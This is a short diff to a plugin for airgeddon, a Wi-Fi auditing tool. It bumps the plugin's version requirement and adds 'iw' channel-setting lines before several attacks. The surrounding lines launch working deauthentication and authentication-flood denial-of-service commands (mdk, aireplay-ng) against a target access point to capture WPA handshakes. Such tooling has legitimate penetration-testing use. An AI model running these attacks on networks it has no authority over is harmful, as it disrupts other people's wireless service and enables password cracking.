@@ -10,7 +10,7 @@ plugin_author="xpz3"
 #Enable/Disable Plugin 1=Enabled, 0=Disabled
 plugin_enabled=1
 
-plugin_minimum_ag_affected_version="11.50"
+plugin_minimum_ag_affected_version="11.60"
 plugin_maximum_ag_affected_version=""
 
 plugin_distros_supported=("*")
@@ -416,6 +416,7 @@ function mass_handshake_capture_dos_handshake_menu() {
 				mass_handshake_capture_capture_handshake_window
 				rm -rf "${tmpdir}bl.txt" > /dev/null 2>&1
 				echo "${bssid}" > "${tmpdir}bl.txt"
+				iw dev "${interface}" set channel "${channel}" > /dev/null 2>&1
 				recalculate_windows_sizes
 				manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_bottomleft_window} -T \"${mdk_command} amok attack\"" "${mdk_command} ${interface} d -b ${tmpdir}bl.txt -c ${channel}" "${mdk_command} amok attack"
 				if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
@@ -436,7 +437,7 @@ function mass_handshake_capture_dos_handshake_menu() {
 					fi
 				fi
 				mass_handshake_capture_capture_handshake_window
-				${airmon} start "${interface}" "${channel}" > /dev/null 2>&1
+				iw dev "${interface}" set channel "${channel}" > /dev/null 2>&1
 				recalculate_windows_sizes
 				manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_bottomleft_window} -T \"aireplay deauth attack\"" "aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface}" "aireplay deauth attack"
 				if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
@@ -457,6 +458,7 @@ function mass_handshake_capture_dos_handshake_menu() {
 					fi
 				fi
 				mass_handshake_capture_capture_handshake_window
+				iw dev "${interface}" set channel "${channel}" > /dev/null 2>&1
 				recalculate_windows_sizes
 				manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_bottomleft_window} -T \"auth dos attack\"" "${mdk_command} ${interface} a -a ${bssid} -m" "auth dos attack"
 				if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
